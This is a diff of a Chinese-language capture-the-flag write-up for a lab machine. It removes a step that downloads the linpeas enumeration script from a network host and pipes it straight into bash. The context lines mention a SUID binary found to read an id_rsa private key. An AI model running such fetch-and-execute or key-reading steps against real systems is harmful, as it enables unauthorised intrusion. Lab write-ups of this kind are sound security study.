@@ -47,12 +47,6 @@ alexia@hommie:~$ cat user.txt
 Imnotroot
 ```
 
-使用 linpeas 找到提升至 root 的路径：
-
-```
-wget -q -O - http://192.168.5.3/scripts/lin/enum/peas.sh|bash
-```
-
 发现了 suid 程序 /opt/showMetheKey，使用 strings 对其进行分析，发现读取 id_rsa 的命令：
 
 ```
